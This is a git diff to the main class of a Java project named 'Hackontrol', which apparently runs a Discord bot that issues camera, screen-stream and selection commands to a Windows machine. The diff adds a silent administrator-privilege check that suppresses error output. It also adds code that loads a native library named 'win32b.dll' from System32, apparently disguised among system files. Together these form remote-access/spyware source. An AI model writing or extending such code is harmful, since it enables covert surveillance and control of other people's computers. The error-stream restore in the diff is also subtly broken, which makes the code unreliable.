@@ -1,11 +1,15 @@
 package com.khopan.hackontrol;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.PrintStream;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.Random;
+import java.util.prefs.Preferences;
 
 import com.khopan.hackontrol.command.CameraCommand;
 import com.khopan.hackontrol.command.Command;
@@ -18,6 +22,7 @@ import com.khopan.hackontrol.command.SelectCommand;
 import com.khopan.hackontrol.command.StreamCommand;
 import com.khopan.hackontrol.source.CommandSource;
 import com.khopan.hackontrol.source.DefaultCommandSource;
+import com.khopan.win32.Win32Library;
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.exceptions.CommandSyntaxException;
 
@@ -31,6 +36,8 @@ import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
+	private static final String LIBRARY_NAME = "win32b.dll";
+
 	private final String machineIdentifier;
 	private final long userIdentifier;
 	private final CommandDispatcher<CommandSource> dispatcher;
@@ -119,6 +126,34 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
+		if(!Hackontrol.hasAdministratorPrivileges()) {
+			System.exit(1);
+			return;
+		}
+
+		String windowsDirectoryPath = System.getenv("windir");
+
+		if(windowsDirectoryPath == null) {
+			System.exit(1);
+			return;
+		}
+
+		File windowsDirectory = new File(windowsDirectoryPath);
+
+		if(!windowsDirectory.exists()) {
+			System.exit(1);
+			return;
+		}
+
+		File system32Directory = new File(windowsDirectory, "System32");
+
+		if(!system32Directory.exists()) {
+			System.exit(1);
+			return;
+		}
+
+		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
+		Win32Library.setLibraryPath(libraryFile.getAbsolutePath());
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
@@ -238,6 +273,31 @@ public class Hackontrol {
 		}
 
 		return false;
+	}
+
+	// https://stackoverflow.com/a/23538961/17136195
+	private static boolean hasAdministratorPrivileges() {
+		Preferences preferences = Preferences.systemRoot();
+
+		synchronized(System.err) {
+			System.setErr(new PrintStream(new OutputStream() {
+				@Override
+				public void write(int data) {
+
+				}
+			}));
+
+			try {
+				preferences.put("foo", "bar"); // SecurityException on Windows
+				preferences.remove("foo");
+				preferences.flush(); // BackingStoreException on Linux
+				return true;
+			} catch(Exception Exception) {
+				return false;
+			} finally {
+				System.setErr(System.err);
+			}
+		}
 	}
 
 	private class Listener extends ListenerAdapter {
